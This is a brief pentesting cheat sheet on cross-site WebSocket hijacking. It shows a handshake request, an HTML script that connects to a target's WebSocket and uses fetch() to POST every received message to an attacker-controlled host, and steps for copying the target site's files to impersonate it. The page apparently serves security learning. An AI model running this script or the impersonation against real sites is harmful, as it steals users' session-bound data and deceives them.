---
title: WebSocket Pentesting
description: WebSocket is a protocol that provides full-duplex communication channels over a single single TCP connection.
tags:
    - Web
refs:
    - https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
date: 2022-12-20
draft: false
---

## Cross-Site WebSocket Hijacking

1. Send messages in the target web page like chat room using WebSocket.

2. Check the WebSocket handshake connection in the request as below. It contains the **“Connection: Upgrade”**, **“Upgrade: websocket”**, **“Sec-WebSocket-Key”**, etc. in the request header.
    
    ```txt
    GET /chat HTTP/1.1
    Host: vulnerable.com
    Connection: Upgrade
    Upgrade: websocket
    Sec-WebSocket-Version: 13
    Cookie: session=wUTqcDb41l4jbfPUt0XKl36FNh36aSrBl
    Sec-WebSocket-Key: NZxnyRVz0Z9yGnOyqAWl4Q==
    ```
    
3. If there is no  CSRF token in the request, we can CSRF on WebSocket.

4. In our WebSocket server, create the script.
    
    ```html
    <script>
    var ws = new WebSocket('wss://<target-url>/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<local-ip>', {method: 'POST', mode: 'no-cors', body: event.data});
    };
    </script>
    ```
    
5. In our attack website, copy files of the target and paste to our web directory to impersonate the target website.
    
    Start web server using Python.
    
    ```html
    sudo python3 -m http.server 80
    ```